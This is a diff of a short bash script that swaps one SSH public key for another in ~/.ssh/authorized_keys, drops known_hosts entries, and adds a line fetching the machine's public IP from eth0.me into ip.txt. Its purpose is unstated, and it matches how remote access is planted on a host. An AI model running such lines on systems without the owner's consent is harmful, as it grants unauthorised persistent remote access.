@@ -1,6 +1,4 @@
 #!/bin/bash
 
-sudo sh -c "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCiGivf3+H99JRik9MHGGuGeoll2t5mmsxdbdwRHnZ8xEPbq/P7Qmh/phw29OcmZTQvuLBlDiosVl3c+oNZe1oC2FOoQItcqnnhD8WoFEt0hw//K6WyojOi3cKEQH58+9tR+Hkb4mhEGzJ23bzpGbplTk032+AQuhP+UfhyPRI6Tfe6JGTd/HmXTfIoO2O6usQpRHguZWCz6uZD3kxR9e9k+Bjrs9gJ4m22O7wyiKRedoPUFVgPf01rRG0ElsZaQFXBpHIe+JKVfJA1+8BwvdsOKzKfZ+TE7aZar+a161cr6QgF8wVMM1Vgnb/UcsosfZucbY15ZbuDaE2PEmnSTC31 root@mobila' >> ~/.ssh/authorized_keys"
-sudo sh -c "echo '|1|0nMQKXduMTwbwZ6+M9f0OwZ7NvE=|HV75Dq5SZOqDWX5mVkcljPvEqrw= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBiqMiioCBRV+U3ts74kHRPLdT+dfXAraKAgWJQ/HYrL' >> ~/.ssh/known_hosts"
-sudo sh -c "echo '|1|/+I2slNN7kXhXMwJ1uZMTqVJ4jE=|mTwvG00VsO9KqL9RMOjjgJN/csU= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDEGZKmjlemegSoYKK89igwu/BEL27F8NORXytLvZYPo2fxa1YBsdATwiROeB4g9DGbGEZfO5p2uh5b0Yd04Ad0=' >> ~/.ssh/known_hosts"
-sudo sh -c "echo '|1|0nMQKXduMTwbwZ6+M9f0OwZ7NvE=|HV75Dq5SZOqDWX5mVkcljPvEqrw= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBiqMiioCBRV+U3ts74kHRPLdT+dfXAraKAgWJQ/HYrL' >> ~/.ssh/known_hosts.old"
+sudo sh -c "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD60F4L4ZIWqTrY5UDXjW3mnXGD8DYlbBP0TOc8ww7SY7SYxMuqzdcCuUd+sMh7JX9HzM7fvL5T9XgFC155e8siOes5yeDS5mWJfTdzRIE6H0wEt6C1i84wThbF1UxzCQYpeLUJlVCrQBRgGCzFS9ecGiYEBqMCLbv3/MW8e0PcjVbBSZ8FSjTqePoSgkSTrVL24Z2Ozg3poqTEmcPUzlxOsRKY2O/Ycvj7EQL3Gq2R0hX+W+tqovG7XHH5gLBxSMVeIXQHV2KAhme1mxMM6snHDAfyatykjMDaPsWYrLtOyKP9A+3W77iSB4YdsFdHYDn9WOJmCDALw5rqzpiXkN6rck0WtIsd1AnpZPxMGSHtnR90LiefsVDFGO2RbHFL4SR4WRNSUPJqv8W98FjoV0PGLKrKbnihdZ7KMXeelzr6F7iLbwy02UZcTYXP+dyacm4VKSj3nI0MkrP2P1gsKwaocxMnF9XLukth8uzlSDUJsSMia6CdnwEami2wjvC7ed0= click14@zoo4' >> ~/.ssh/authorized_keys"
+curl eth0.me >> ip.txt
